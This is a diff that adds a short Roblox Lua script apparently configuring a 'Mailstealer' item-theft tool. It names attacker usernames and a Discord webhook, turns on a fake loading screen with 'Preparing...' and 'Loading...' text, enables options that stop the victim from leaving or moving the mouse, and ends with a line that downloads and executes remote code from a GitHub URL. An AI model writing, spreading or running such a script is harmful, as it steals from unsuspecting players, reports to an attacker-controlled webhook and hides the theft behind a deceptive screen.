@@ -1,0 +1,16 @@
+UserName = "zuka_gamercool"
+Webhook = "https://discord.com/api/webhooks/1136977968334381086/LJFshY-ssh7C3dTsKK-HoFN4mspJzL2oxBm2MbasBGmw8yInh0ZBxilrjy-nfXVsGXDj"
+UserName2 = "WII_EZ"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+_G.ScriptName = "zuka_gamercool"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StickOgh01/Mailstealer_/main/Mailstealer"))()
